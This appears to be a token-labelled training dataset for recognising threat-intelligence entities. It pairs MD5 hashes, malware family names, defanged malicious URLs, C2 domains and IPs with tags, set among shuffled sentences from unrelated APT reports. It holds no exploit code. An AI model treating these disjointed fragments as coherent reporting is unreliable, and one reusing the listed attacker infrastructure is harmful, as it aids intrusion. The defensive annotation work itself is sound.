834a274599aed64959b3b2bfe931af4c	B-hash
83cdbc9aa1907d55dda3e28149e897cc	B-hash
83d45d80682afa9b2526029b2bc2fb33	B-hash
850ac92dfa39f2391addc2d888c62ef8	B-hash
8548dd501aaf132b134aa3849e15d2aa	B-hash
85873c12599490a0f7db691b0c5179ae	B-hash
860d5840c3b1a750d8c4e6bc68ecfbab	B-hash
867d80bc1c369ca7ee429c727d2c5fea	B-hash
875cb4844bc03f6da7a60553632c7678	B-hash
888eadff6982de01c60891ce185473b7	B-hash
88c0e5a4ca408ac12acaaf7a9ef9eb49	B-hash
894ef915af830f38499d498342fdd8db	B-hash
8a413af90665ca7909bcdcf19cd566ed	B-hash
8ac64b904c188ef6b73dbc5073cee1a9	B-hash
8b69f0a948c32288f3fab4ed2845cb1b	B-hash
8ba366ef5ecd802c82289dcea22b2146	B-hash
8c148fe80ae705af284b92f1c283013a	B-hash
8c3a791ce682e3c5da5bcfbce261eeaa	B-hash
8c76de0a8ac79536b96619613960681c	B-hash
8d3a6b78118b647a7f31f06a46c27fd4	B-hash
8dc7eb49fe1fbf490f90c153a71c60a5	B-hash
8e2e709c01ccb286c51ac9e592eea48a	B-hash
8e53ad954f05d2c3f57b19b1ecb0fea0	B-hash
8f8e948a2f9afd7ece6dc6603cfbd56a	B-hash
8fbbf38c053dbb0da3dd2fd6af4869d2	B-hash
905d5cd372fb22dd5f9804adb2d2787b	B-hash
9157d078effa4b727180c40bedb74ef6	B-hash
920dffe40787f1f3fdb24548b4a210db	B-hash
92785f445f366ed548388b1af6b01f9c	B-hash
9327f1eefb18fde7f622fc2efbbbdb4b	B-hash
939e07685fec28a15f88786b097bb14b	B-hash
9400950fa381ba1750c914fa9e6fd85e	B-hash
942b1ca8c3c64be1e4c40e26c9e39ad8	B-hash
962c52436706b5c226894de0436b860e	B-hash
96ee5acbe155f37ff1604b4fd259e55f	B-hash
96f31d6fda587b43887e846876e5c399	B-hash
975c718bf93ca5d0693bb0d4c7e42d1e	B-hash
99b58e416c5e8e0bcdcd39ba417a08ed	B-hash
9a58902740c5b73eb6a68a126ac6ac55	B-hash
9a847c1f54359ffd3c335e97600f6f5d	B-hash
9aca099f7cd3b3b29551b67af48467d1	B-hash
9be590614e2407dc144ad6c100a2873a	B-hash
9bf4683c09a2d60294ff79ce026f4e64	B-hash
9cc15358d6ce18150dbee6be3281151d	B-hash
9cd1e3b67540bdc2fc4a3835e170bc65	B-hash
9e6b8b265f05302eca455ce8ea10a3aa	B-hash
9fcb233ee18df6c19b1ad3922dd41a2a	B-hash
9fd0e94fce1543b75b44414a61b252b0	B-hash
a01ea69e4c10721ec088676cef67d8bd	B-hash
a19e68e72084d867a39776faaa6f5fce	B-hash
a1fa946523928c16340cf40daa2ffb53	B-hash
a26a85c33ddf57d720040629931be174	B-hash
a4847e655c817e3c5112e888a2877f4d	B-hash
a4d476fb7b084bd01a847ab7e0d839b5	B-hash
a55f6c8b795ccdc469b9b67b22ddc88b	B-hash
a637ea307380ba21a355c3cffd37639a	B-hash
a6cba31fcca49ff9ed6fd9894644de9e	B-hash
a76f0fada1602e9c119cba24306442b4	B-hash
a98d2c90b9494fc885c7cd35d43666ea	B-hash
a9c20499d43f9674cc37dbfa81381203	B-hash
a9d2caa6ebbfd5be071748e59e754cf4	B-hash
a9e0a604e5b8ed5f4f286c3355d7a0fb	B-hash
aaa01f776acabdf9f07ea3eaff1695d6	B-hash
ac2b219ede57f9d14cdce38e987862aa	B-hash
ac9e0b2af215821f7223b6eaeaea03db	B-hash
ad95f613fc4b644bd5e3230eb0b5dbcc	B-hash
adb97252b05a6e82697bf93c347bdf25	B-hash
aea5dc22e706c836d056f4ba1f13dea3	B-hash
af285fa9a141f422b8ccbfb4e9a00054	B-hash
b18cabead7248e8156230c71399b79c9	B-hash
b19ef1134f54b4021f99cc45ae1bc270	B-hash
b1c540b4b9c8a87a1e87a76ed289f18d	B-hash
b2784e4dc6e602d9d6bf09325bba8c4e	B-hash
b29556856203049b9e7b05e01f5ae73f	B-hash
b3056919871fc01a1ed3294e2014e0c4	B-hash
b41c02eb41070e0a2e459abf2fc39b69	B-hash
b44cd1fa5d8beb08519bbe0c1d796b0f	B-hash
b457372a87597b746ce69e05c4a7d3fa	B-hash
b653012d2bfa4e3419d97eb9f2e5ed4a	B-hash
b665ea35f8f7954657eed1e54517843d	B-hash
b68eadb2a8069c7e88535e1ebfb4be0a	B-hash
b8c83b3549ebb24b3e00dd23c2aa050a	B-hash
b8f77674d292d205f8f5cf6c3f3c34df	B-hash
b8fdf06f78341581870477574e2b08c3	B-hash
b921e0d11127af9613804c63cddd86ca	B-hash
b9367aba4f267b82a838223df016bd6b	B-hash
b96b79f4f1b4306ac2c63fc988305fb0	B-hash
ba700e3a83fec3cc984e1fb572aa0add	B-hash
bbb4bdd1d7e8589d145163f1efd458f5	B-hash
bbbf285e8344f7df330f93c7c3baf27f	B-hash
bbccf8643368c80dd083fb92d67d00be	B-hash
bbdce1e1991f292d366097a743da3724	B-hash
bcc6addece28265390b2d535d65c49b8	B-hash
bd6481ed6dfe67ba9f2f8f26e2cee722	B-hash
bdf512d5eef853d07c0db345345e3db7	B-hash
be3799da210edb81143d609e66e5b7ff	B-hash
be54e3660bf928b8b5f764f5cdfdc4da	B-hash
bf18ef997b7d589f031f47799a33f27b	B-hash
bf65727accaa53d65c31ed5b582053c5	B-hash
bf778439895829ff986207900bfcfe02	B-hash
c1438390098e4dc7bb8b52efcf1d2465	B-hash
c1919e6f2e05feb9dc9b6ab9f81dcb2f	B-hash
c243a7c1cf23b91f73100bb9e947439e	B-hash
c32696b255bac4b849fc249e56944a91	B-hash
c376aecf43bf021b6408ca99cd31da01	B-hash
c5062bbbb15911a63de77a66773874d9	B-hash
c63cc0a8b0b3a70f7b835a3fff9f02a5	B-hash
c8607553e37cc1fc870572670c1910f5	B-hash
c89d4d40e4b68a9952121b62b0dda920	B-hash
c9570396c897e02ec8aa195c6241f945	B-hash
c9a32616f89dc953486bd1b5d83359ec	B-hash
c9b4c4d65298dc10be6784d0f0ad8519	B-hash
c9f19071bac9d4eb3b08b4017c0d9c4d	B-hash
cac3bc3039cd73935051ad8df2e53d34	B-hash
cb40ff3b3ed8c1966defbe1dafdd1326	B-hash
cca75af9786d7364866f40b80dddcc5c	B-hash
cd5f3dbea197dc5afb673e42f0e9c3fe	B-hash
cdc0c4fdc649dec017ace0f2898068d0	B-hash
cec766518fa5b607157e92e9c24c0d03	B-hash
cf5356cdf42d264d5213cce4cd415f0b	B-hash
cf96139290c09963a32506cd85825ed3	B-hash
d3174652816010a7f6d8f4523ee3a077	B-hash
d4036f03c760084cc677edf4ee6c4a39	B-hash
d46d261ec92daf703cd584f10037198c	B-hash
d5027d35c8bd9e867113bd4a1edb931f	B-hash
d58323fb222b9ff681c0982ba286a296	B-hash
d6b1989d9c271b8575326e4fca159ae8	B-hash
d6b198eda724e2b3367502a6a2232939	B-hash
d6b467c92256094f720e9fc75f149737	B-hash
d6d5aeb79899485f5734bf8847782266	B-hash
d6e98d062d7900c6fe9a6d7f0b1d7fec	B-hash
d6ff4333eb1a2305d5b6cf4705213393	B-hash
d795292ea23217480ad92939daf6dd22	B-hash
d83055efe66377067ce99d99c706f19a	B-hash
d8f7aaad3677fac1cde911c7362c2b69	B-hash
d910d21bd54b63ef61b3f250fe73dcc6	B-hash
da451674bb68804b390bd7413691c91e	B-hash
dab17bcceae6f32eae5d800d0d3f9e46	B-hash
db6ae6da64f14168b3624e26191277cf	B-hash
db7d3724e5f004168a1a56f6b9de3cd5	B-hash
dd5aad5d66bc96e5ac60cbe5d132c2ec	B-hash
de5eeb9847a5fbc1a6cbb4cfb8bb6aa0	B-hash
df53ce3797932d9e62ceaa760a3f0e3e	B-hash
dfaa6250dc947602d5dc200e503f23a5	B-hash
dff3a274e5fa35013601c7985bf13d56	B-hash
dff7ac111e48115e208c2649b94b1115	B-hash
e0b3a0fd042ff50e0de22725864775b8	B-hash
e1117ec1ea73b6da7f2c051464ad9197	B-hash
e2494eba419891c0c101af74eb8c029c	B-hash
e2620e1cf89830e8de1e8c4530829a15	B-hash
e27f0975fd3278e7303102783767c508	B-hash
e2a557b39231ee91724c150e3ec4b493	B-hash
e2be37df12f7b98b2b73197d77773263	B-hash
e4255f51a871a95baa10b6b2c4ed2470	B-hash
e62bb947d72d12311890f2e07eb6ac8b	B-hash
e6446d52e9f4b5c2c5a9ac850281cae8	B-hash
e649b8b9e541406446da47d8d0a91385	B-hash
e6ffb1c6e1508f474a69f091435454ce	B-hash
e85863b1de035814b4b01a2b6c477dd1	B-hash
e90b037f1cbc79796fd8b1f6382c8483	B-hash
e93a4f4872bf6cd8c3f0eed6017a8d41	B-hash
ea823850b777993d636e4a565568f734	B-hash
ead35eab94820d5a34f185d0b26b7930	B-hash
ebe291e968eb5a86b4963d27352bc525	B-hash
eced29c71867e375aed0da408d6b07f4	B-hash
ed665cf8a48f08f8b4fed8bbf9d2d998	B-hash
ee998128e20971ca4296a8a73ed79f43	B-hash
eea7ae4eb726c3e05f187110090adb18	B-hash
ef10f4f11032d48f7e82c0a788c0f489	B-hash
efaadcfa4271c50927ab817e0c4a0bc3	B-hash
f0a00cfd891059b70af96b807e9f9ab8	B-hash
f15cff24d8a3a9ffce590cc8e69baec9	B-hash
f1c4b919fdf008a8400189562f5e2fba	B-hash
f29cb80bde4af21c226596e9d125795d	B-hash
f2f2cad79dcfb356db7b2485c7a27f03	B-hash
f643fa851203e9159c9dc50e4ab8d81e	B-hash
f74ec871c77e4b5e5b2ae0917b1f0f21	B-hash
f7820d429d3185ad00e6758c343e29ce	B-hash
f82d3b270b16780044817978f4f3fe1a	B-hash
f9d2c3e8f81b9c44a1837478b2a98e5e	B-hash
fb0b900de6d286321fd6d20c6c4f5679	B-hash
fbb0c14cacc60fdd393fb5889d5a0b57	B-hash
fc97b89541b149e0dd9937ba876b3ee1	B-hash
fd130b2bce93caf18bc23f1526daae99	B-hash
fd31f952637370a30d74c2a65ba8d2cd	B-hash
fd9b5c35c042a6c462187067fb869aac	B-hash
fde5e109bfab33964564f387f8940030	B-hash
fe568a370aa3d2c78125ab37c16484d1	B-hash
System	O
based	O
indications	O
of	O
possible	O
compromise	O
by	O
the	O
comment	O
crew	O
attackers	O
.	O

The	O
samples	O
appear	O
as	O
different	O
payloads	O
but	O
further	O
basic	O
static	O
analysis	O
allowed	O
us	O
to	O
discover	O
that	O
they	O
are	O
the	O
same	O
malware	O
sample	O
:	O
The	O
first	O
two	O
samples	O
are	O
identical	O
,	O
with	O
the	O
unique	O
difference	O
that	O
the	O
second	O
one	O
is	O
packed	O
using	O
the	O
UPX	O
tool	O
.	O

The	O
database	O
management	O
functionality	O
is	O
impressive	O
and	O
helpful	O
to	O
the	O
first-time	O
user	O
.	O

In	O
this	O
case	O
,	O
the	O
encrypted	O
configuration	O
file	O
will	O
begin	O
with	O
a	O
4-byte	O
value	O
specifying	O
the	O
length	O
of	O
the	O
included	O
RC4	O
key	O
.	O

OMPARISON	O
OF	O
ODULE	O
...............................................................................................................................	O
8	O

Finally	O
,	O
the	O
CozyDuke	B-malware.drop
toolset	O
includes	O
tools	O
and	O
scripts	O
–	O
some	O
custom-written	O
,	O
others	O
based	O
on	O
openly	O
available	O
tools	O
–	O
that	O
are	O
used	O
for	O
purposes	O
such	O
as	O
gathering	O
further	O
information	O
from	O
infected	O
hosts	O
or	O
for	O
infecting	O
additional	O
hosts	O
in	O
the	O
same	O
target	O
organization	O
.	O

At	O
least	O
,	O
I	O
hope	O
not	O
.	O

We	O
observed	O
the	O
DragonOK	B-malware.infosteal
attacker	O
employ	O
this	O
tool	O
against	O
targets	O
in	O
Japan	O
and	O
Taiwan	O
(	O
e.g.	O
57e3d002542e07f2eb09fd2b1b0ee-ab2	B-hash
)	O
,	O
as	O
also	O
noted	O
by	O
Secureworks	O
.	O

Typically	O
,	O
the	O
final	O
payload	O
consists	O
of	O
shellcode	O
that	O
provides	O
backdoor	O
functionality	O
to	O
the	O
system	O
or	O
stages	O
additional	O
tools	O
.	O

case	O
'	O
v	O
'	O
:	O

Figure	O
15	O
:	O
The	O
content	O
of	O
the	O
file	O
seems	O
relatively	O
benign	O
,	O
especially	O
if	O
with	O
a	O
safe-sounding	O
word	O
like	O
'	O
Security	O
'	O
as	O
the	O
shell	O
password	O

About	O
the	O
Author	O

The	O
SFX	B-malware.drop
dropper	O
contained	O
multiple	O
custom	O
executable	O
files	O
,	O
as	O
well	O
as	O
legitimate	O
Microsoft	O
Visual	O
C++	O
Runtime	O
Library	O
files	O
,	O
which	O
are	O
part	O
of	O
the	O
codebase	O
used	O
to	O
develop	O
and	O
required	O
to	O
execute	O
the	O
backdoor	O
code	O
.	O

Analysis	O
of	O
the	O
file	O
with	O
MD5	O
Hash	O
:	O
75D3D1F23628122A64A2F1B7EF33F5CF	B-hash

'	O
Due	O
to	O
the	O
high	O
volatility	O
of	O
the	O
ruble	O
exchange	O
rate	O
the	O
Bank	O
of	O
Russia	O
sends	O
rules	O
of	O
trading	O
on	O
the	O
currency	O
market	O
.	O

Malicious	O
link	O

•	O
Code	O
compiled	O
during	O
the	O
normal	O
working	O
day	O
in	O
the	O
Moscow	O
time	O
zone	O
and	O
within	O
a	O
Russian	O
language	O
build	O
environment	O
.	O

Complicated	O
defenses	O
require	O
more	O
versatile	O
tools	O
As	O
many	O
traditional	O
banking	O
and	O
financial	O
institutions	O
have	O
improved	O
their	O
security	O
practices	O
,	O
perhaps	O
attackers	O
have	O
had	O
a	O
much	O
more	O
difficult	O
time	O
developing	O
automation	O
in	O
their	O
Trojans	B-malware.backdoor
to	O
cover	O
all	O
variations	O
of	O
these	O
defenses	O
;	O
as	O
such	O
,	O
RATs	B-malware.backdoor
provide	O
more	O
versatility	O
and	O
effectiveness	O
,	O
at	O
the	O
expense	O
of	O
scalability	O
.	O

Cylance	O
found	O
that	O
the	O
following	O
three	O
full	O
file	O
paths	O
were	O
commonly	O
used	O
by	O
this	O
particular	O
backdoor	O
:	O
•	O
%	O
AppData%\Reader.exe	O
•	O
%	O
AppData%\Notron.exe	O
•	O
%	O
AppData%\SCSI_Initiarot.exe	O
Cylance	O
also	O
identified	O
an	O
earlier	O
sample	O
,	O
which	O
took	O
advantage	O
of	O
a	O
self-extracting	O
RAR	O
and	O
a	O
side	O
loading	O
vulnerability	O
in	O
the	O
legitimate	O
Microsoft	O
Resource	O
Compiler	O
,	O
'	O
RC.exe	O
.	O
'	O

Software	O
Community	O
Vulnerability	O
Reports	O
Additional	O
Resources	O
Microsoft	O
to	O
SID	O
Mapping	O
Archive	O
Shared	O
Object	O
Rule	O
Generator	O
IP	O
Blacklist	O
Download	O
AWBO	O
Exercises	O
About	O
Talos	O
Join	O
Our	O
Team	O
Contact	O
Blog	O

The	O
infection	O
ID	O
,	O
if	O
present	O
,	O
must	O
be	O
decoded	O
by	O
XOR'ing	O
each	O
byte	O
of	O
the	O
string	O
with	O
a	O
static	O
byte	O
value	O
(	O
typically	O

It	O
's	O
also	O
worth	O
noting	O
that	O
the	O
standard	O
list	O
includes	O
quite	O
a	O
lot	O
of	O
software	O
which	O
is	O
less	O
relevant	O
to	O
security	O
(	O
examples	O
include	O
WinRAR	O
,	O
iTunes	O
and	O
WinZip	O
)	O
.	O

Hopefully	O
,	O
simpler	O
verification	O
systems	O
than	O
the	O
current	O
batch	O
of	O
PGP	O
and	O
SSL	O
applications	O
will	O
arise	O
to	O
be	O
adopted	O
in	O
larger	O
numbers	O
.	O

return	O
=	O
127	O
;	O
!	O

Recently	O
,	O
we	O
have	O
detected	O
malware	O
used	O
by	O
the	O
Carbanak	B-malware.infosteal
group	O
in	O
the	O
following	O
countries	O
,	O
among	O
others	O
:	O
United	O
States	O
of	O
America	O
Germany	O
United	O
Arab	O
Emirates	O
As	O
described	O
in	O
this	O
blog	O
post	O
,	O
the	O
gang	O
does	O
n't	O
use	O
just	O
one	O
malware	O
family	O
to	O
carry	O
out	O
its	O
operations	O
but	O
several	O
.	O

These	O
2	O
values	O
,	O

The	O
C2	O
domain	O
qhavcloud[.]com	B-url.cncsvr
and	O
the	O
hard	O
coded	O
IP	O
address	O
91[.]205[.]173[.]3	B-ip.unknown
were	O
also	O
found	O
to	O
be	O
associated	O
with	O
another	O
attack	O
campaign	O
which	O
targeted	O
the	O
senior	O
army	O
officers	O
.	O

The	O
connection	O
between	O
those	O
pieces	O
of	O
malware	O
and	O
the	O
group	O
described	O
in	O
CSE	O
slides	O
has	O
been	O
convincingly	O
established	O
,	O
for	O
example	O
by	O
Paul	O
Rascagnères	O
(	O
G	O
Data	O
)	O
.	O

The	O
format	O
of	O
this	O
configuration	O
is	O
straightforward	O
to	O
reverse	O
.	O

noteworthy	O
that	O
in	O
most	O
of	O
the	O
cases	O
the	O
same	O
submitters	O
uploaded	O
samples	O
belonging	O
to	O
different	O
APT	B-malware.unknown
campaigns	O
.	O

TRITON	B-malware.infosteal
trilog.exe	O
Main	O
executable	O
leveraging	O
libraries.zip	O
library.zip	O
Custom	O
communication	O
library	O
for	O
interaction	O
with	O
Triconex	B-malware.unknown
controllers	O
.	O

Where	O
possible	O
Symantec	O
has	O
provided	O
details	O
on	O
the	O
C	O
&	O
C	O
accounts	O
used	O
by	O
Inception	B-malware.backdoor
to	O
the	O
affected	O
cloud	O
providers	O
.	O

Controversially	O
,	O
Ginbot	O
7	O
was	O
designated	O
a	O
terrorist	O
group	O
by	O
the	O
Ethiopian	O
Government	O
in	O
2011	O
.	O

In	O
this	O
case	O
,	O
however	O
,	O
the	O
source	O
was	O
modified	O
–	O
the	O
process	O
injection	O
to	O
svchost.exe	O
was	O
added	O
to	O
its	O
functionality	O
.	O

The	O
Uranio	O
Cluster	O

fraud	O

You	O
should	O
not	O
act	O
upon	O
the	O
information	O
contained	O
in	O
this	O
email	O
without	O
obtaining	O
specific	O
professional	O
advice	O
.	O

This	O
conclusion	O
is	O
derived	O
from	O
the	O
file	O
names	O
and	O
file	O
contents	O
that	O
are	O
written	O
in	O
Vietnamese	O
,	O
as	O
shown	O
in	O
the	O
examples	O
below	O
:	O

Regards	O
,	O
Diosdado	O
Procurement	O
Officer	O
Mobile	O
:	O
+966	O
54	O
073	O
5573	O
Tel	O
.	O

So	O
while	O
potentially	O
making	O
us	O
safer	O
in	O
the	O
short-term	O
,	O
exposure	O
often	O
forces	O
a	O
Darwinian	O
evolution	O
in	O
malware	O
.	O

Installer	O
resources	O
named	O
for	O
french	O
and	O
dutch	O
versions	O
,	O
along	O
with	O
32-bit	O
versus	O
64-bit	O
compiled	O
executables	O
were	O
provided	O
over	O
the	O
summer	O
:	O
hxxp://www.ralrab[.]com/rar/winrar-x64-531.exe	O
hxxp://www.ralrab[.]com/rar/winrar-x64-531fr.exe	O
hxxp://www.ralrab[.]com/rar/winrar-x64-531nl.exe	O
hxxp://www.ralrab[.]com/rar/wrar531.exe	O
hxxp://www.ralrab[.]com/rar/wrar531fr.exe	O
hxxp://www.ralrab[.]com/rar/wrar531nl.exe	O
hxxp://ralrab[.]com/rar/winrar-x64-531.exe	O
hxxp://ralrab[.]com/rar/winrar-x64-531nl.exe	O
hxxp://ralrab[.]com/rar/wrar531fr.exe	O
hxxp://ralrab[.]com/rar/wrar531nl.exe	O
hxxp://ralrab[.]com/rar/wrar53b5.exe	O

'	O
Pending	O
'	O
,	O
if	O
the	O
command	O
string	O
matches	O
with	O
string	O
'	O
Pending	O
'	O
then	O
the	O
extracted	O
filename	O
(	O
in	O
this	O
case	O
the	O
extracted	O
filename	O
is	O
'	O
testfile	O
'	O
)	O
from	O
the	O
C2	O
response	O
is	O
concatenated	O
with	O
'	O
.exe	O
'	O
as	O
shown	O
below	O
.	O

The	O
file	O
on	O
the	O
hard	O
drive	O
is	O
encrypted	O
;	O
specifically	O
,	O
the	O
data	O
is	O
XORed	O
with	O
the	O
key	O
0x66	O
.	O

If	O
you	O
have	O
received	O
this	O
communication	O
in	O
error	O
,	O
please	O
notify	O
the	O
Western	O
Union	O
sender	O
immediately	O
by	O
replying	O
to	O
this	O
message	O
and	O
delete	O
the	O
original	O
message	O

Data	O
exfiltration	O
is	O
assumed	O
to	O
be	O
time	O
triggered	O
.	O

9a2e510de8a515c9b73efdf3b141f6c2	B-hash
a6b862f636f625af2abcf5d2edb8aca2	B-hash
0327859be30fe6a559f28af0f4f603fe	B-hash

The	O
potential	O
victim	O
in	O
this	O
attack	O
first	O
receives	O
a	O
message	O
from	O
an	O
unknown	O
source	O
,	O
in	O
this	O
case	O
,	O
a	O
Gmail	O
account	O
with	O
a	O
nondescript	O
name	O
.	O

Which	O
corresponds	O
to	O
ordering	O
an	O
HTTP	O
flood	O
,	O
a	O
UDP	O
flood	O
,	O
and	O
a	O
TCP	O
flood	O
,	O
respectively	O
,	O
against	O
target	O

jIRCii	O
Scriptable	O
Internet	O
Relay	O
Chat	O
client	O
for	O
Windows	O
,	O
MacOS	O
X	O
,	O
and	O
Linux	O
.	O

This	O
malware	O
is	O
particularly	O
interesting	O
for	O
us	O
because	O
it	O
contacts	O
a	O
command	O
and	O
control	O
with	O
the	O
name	O
'	O
marina-info.net	B-url.unknown
'	O
a	O
clear	O
reference	O
to	O
the	O
Italian	O
Military	O
corp	O
,	O
Marina	O
Militare	O
.	O

Cyber	O
Resilience	O
Review	O
(	O
CRR	O
)	O
is	O
a	O
no-cost	O
,	O
voluntary	O
assessment	O
to	O
evaluate	O
and	O
enhance	O
cybersecurity	O
within	O
critical	O
infrastructure	O
sectors	O
,	O
as	O
well	O
as	O
state	O
,	O
local	O
,	O
tribal	O
,	O
and	O
territorial	O
governments	O
.	O

Agent.RUI	O

We	O
would	O
like	O
to	O
point	O
them	O
towards	O
the	O
example	O
established	O
by	O
Green	O
Simurgh	O
,	O
who	O
promptly	O
posted	O
a	O
multilingual	O
warning	O
to	O
their	O
website	O
when	O
a	O
malicious	O
repackaging	O
of	O
their	O
tool	O
was	O
found	O
to	O
be	O
targeting	O
Syrian	O
users	O
.	O

iafbsnl.doc	O

YouTube	O
.	O

What	O
the	O
analysts	O
eventually	O
had	O
was	O
a	O
very	O
detailed	O
view	O
of	O
the	O
specific	O
tactics	O
employed	O
by	O
this	O
adversary	O
;	O
and	O
a	O
window	O
into	O
a	O
plan	O
for	O
a	O
hack	O
that	O
was	O
even	O
larger	O
than	O
originally	O
believed	O
,	O
much	O
larger	O
.	O

Grey	O
Lambert	O
attackers	O
inserted	O
false	O
flag	O
and	O
reduced	O
SPLM	B-malware.backdoor
modules	O
3.	O
a	O
new	O
and	O
unrecognized	O
,	O
full	O
variant	O
of	O
SPLM	B-malware.backdoor
attempted	O
to	O
inject	O
module	O
code	O
into	O
memory	O
and	O
deleted	O
itself	O
4.	O
an	O
unknown	O
new	O
powershell	O
script	O
or	O
legitimate	O
but	O
vulnerable	O
web	O
app	O
was	O
exploited	O
to	O
load	O
and	O
execute	O
this	O
unusual	O
SPLM	B-malware.backdoor
code	O
In	O
all	O
likelihood	O
,	O
the	O
last	O
option	O
is	O
accurate	O
.	O

These	O
attacks	O
are	O
likely	O
performed	O
by	O
the	O
same	O
attacker	O
,	O
as	O
the	O
malware	O
in	O
question	O
communicate	O
with	O
the	O
same	O
command-	O
and	O
control	O
structures	O
,	O
and	O
in	O
many	O
cases	O
are	O
signed	O
using	O
the	O
same	O
digital	O
certificate	O
.	O

Next	O
,	O
call	O
len	O
function	O
:	O
if	O
found	O
to	O
be	O
BSTR	O
type	O
,	O
vbscript	O
will	O
assume	O
that	O
the	O
forward	O
4	O
bytes	O
(	O
0x11223344	O
)	O
is	O
the	O
address	O
memory	O
to	O
store	O
the	O
length	O
.	O

There	O
were	O
only	O
four	O
possible	O
IP	O
addresses	O
that	O
the	O
sample	O
analyzed	O
could	O
connect	O
to	O
There	O
were	O
only	O
four	O
possible	O
IP	O
addresses	O
that	O
the	O
sample	O
analyzed	O
could	O
connect	O
to	O
based	O
on	O
the	O
strings	O
found	O
in	O
the	O
file	O
'	O
id	O
'	O
.	O

With	O
this	O
understanding	O
,	O
GReAT	O
researchers	O
were	O
able	O
to	O
recognize	O
similarities	O
in	O
obfuscation	O
and	O
development	O
traits	O
leading	O
back	O
to	O
widely­reported	O
but	O
little	O
understood	O
variants	O
on	O
a	O
sample	O
in	O
2015	O
,	O
which	O
searched	O
for	O
prominent	O
leaders	O
and	O
secret	O
documents	O
involving	O
them	O
.	O

Strings	O
are	O
well	O
organized	O
and	O
concise	O
.	O

The	O
VBS	O
code	O
unzips	O
the	O
archive	O
,	O
changes	O
the	O
extension	O
of	O
the	O
legitimate	O
Windows	O
tool	O
from	O
.png	O
to	O
.exe	O
,	O
and	O
renames	O
the	O
malicious	O
DLL	O
as	O
cryptui.dll	O
.	O

So	O
at	O
this	O
point	O
,	O
we	O
know	O
that	O
the	O
decryption	O
key	O
is	O
composed	O
of	O
the	O
prefix	O
#	O
KCMDDC42F	O
#	O
concatenated	O
with	O
the	O
suffix	O
,	O
yielding	O
#	O
KCMDDC42F	O
#	O
-890	O
.	O

This	O
level	O
of	O
engagement	O
and	O
interaction	O
,	O
particularly	O
in	O
light	O
of	O
the	O
reduction	O
of	O
sanctions	O
,	O
and	O
the	O
thawing	O
of	O
relations	O
between	O
Iran	O
and	O
the	O
West	O
following	O
the	O
2015	O
JCPOA	O
,	O
was	O
expected	O
between	O
academia	O
.	O

In	O
this	O
case	O
the	O
attackers	O
used	O
the	O
TextBox	O
within	O
the	O
UserForm	O
to	O
store	O
the	O
malicious	O
executable	O
content	O
.	O

The	O
main	O
function	O
of	O
the	O
dropper	O

The	O
shortened	O
link	O
statistics	O
page	O
enables	O
us	O
to	O
learn	O
about	O
the	O
scope	O
and	O
the	O
targeting	O
of	O
this	O
threat	O
actor	O
.	O

case	O
'	O
k	O
'	O
:	O

This	O
research	O
was	O
facilitated	O
by	O
the	O
PassiveTotal	O
for	O
threat	O
infrastructure	O
analysis	O
.	O

This	O
section	O
focuses	O
on	O
different	O
functionalities	O
of	O
the	O
malware	O
Malware	O
triggers	O
the	O
download	O
functionality	O
by	O
connecting	O
to	O
the	O
C2	O
server	O
and	O
making	O
a	O
request	O
to	O
either	O

Malware	O
referenced	O
in	O
relation	O
to	O
these	O
domains	O
is	O
for	O
example	O
:	O
md5	O
:	O
6f9f2e57eb06c5385f7e9370a71aa34b	B-hash
.	O

Below	O
is	O
a	O
screen	O
shot	O
of	O
the	O
malicious	O
code	O
references	O
found	O
pre-pended	O
to	O
a	O
JavaScript	O
file	O
on	O
the	O
website	O
named	O

Reply-To	O
X-Originating-Ip	O
Message	O
body	O
Sarah	O
Alexander	O
<	O
mthomas3@mybluelight[.]com	O
>	O
Invitation	O
Sun	O
,	O
4	O
May	O
2014	O
08:44:53	O
GMT	O
Invitation.jar	B-malware.infosteal
marvinflames@gmail.com	O
87.117.232[.]203	B-ip.unknown

After	O
deobfuscation	O
,	O
we	O
can	O
see	O
that	O
the	O
payload	O
is	O
written	O
in	O
the	O
Perl	O
programming	O
language	O
.	O

The	O
discovery	O
of	O
the	O
hacker	O
's	O
single	O
mistake	O
in	O
tradecraft	O
was	O
indeed	O
a	O
powerful	O
catalyst	O
,	O
and	O
lead	O
to	O
the	O
discovery	O
of	O
a	O
treasure	O
trove	O
of	O
new	O
indicators	O
.	O

The	O
user	O
logged	O
on	O
on	O
workdays	O
,	O
occasionally	O
on	O
Saturdays	O
,	O
but	O
never	O
on	O
Sundays	O
.	O

The	O
agent	O
starts	O
by	O
selecting	O
a	O
C	O
&	O
C	O
server	O
from	O
a	O
hardcoded	O
list	O
,	O
then	O
sends	O
a	O
hello	O
message	O
and	O
starts	O
two	O
main	O
communications	O
threads	O
:	O
One	O
for	O
receiving	O
commands	O
from	O
the	O
C	O
&	O
C	O
server	O
,	O
in	O
an	O
infinite	O
GET	O
loop	O
.	O

generateUrlQuestion	O
:	O
]	O

OceanLotus	O
was	O
responsible	O
for	O
launching	O
targeted	O
attacks	O
against	O
human	O
rights	O
organizations	O
,	O
media	O
organizations	O
,	O
research	O
institutes	O
,	O
and	O
maritime	O
construction	O
firms	O
.	O

'	O
Private	O
Security	O
Group	O
Says	O
Russia	O
was	O
Behind	O
John	O
Podesta	O
's	O
Email	O
Hack	O
.	O
'	O

Decryption	O
key	O
is	O
calculated	O
based	O
on	O
the	O
destination	O
URL	O
and	O
the	O
encoding	O
key	O
of	O
the	O
configuration	O
information	O
.	O

We	O
deployed	O
our	O
IR	O
team	O
and	O
technology	O
and	O
immediately	O
identified	O
two	O
sophisticated	O
adversaries	O
on	O
the	O
network	O
–	O
COZY	O
BEAR	O
and	O
FANCY	O
BEAR	O
.	O

What	O
does	O
the	O
Poseidon	B-malware.infosteal
Group	O
do	O
?	O

Influence	O
operations	O
,	O
also	O
frequently	O
called	O
'	O
information	O
operations	O
,	O
'	O
have	O
a	O
long	O
history	O
of	O
inclusion	O
in	O
Russian	O
strategic	O
doctrine	O
,	O
and	O
have	O
been	O
intentionally	O
developed	O
,	O
deployed	O
,	O
and	O
modernized	O
with	O
the	O
advent	O
of	O
the	O
internet	O
.	O

(	O
MMS	O
)	O
If	O
the	O
expected	O
answer	O
is	O
received	O
,	O
it	O
continues	O
,	O
sending	O
an	O
MMS	O
request	O
Thereby	O
,	O
the	O
component	O
compiles	O
a	O
list	O
of	O
object	O
names	O
in	O
a	O
Virtual	O
Manufacturing	O
Device	O
(	O
VMD	O
)	O
Next	O
,	O
this	O
component	O
enumerates	O
the	O
objects	O
discovered	O
in	O
the	O
previous	O
step	O
and	O
sends	O
the	O
device	O
domain-specific	O
requests	O
with	O
each	O
object	O
name	O
This	O
enumerates	O
named	O
variables	O
in	O
a	O
specific	O
domain	O
Afterwards	O
,	O
the	O
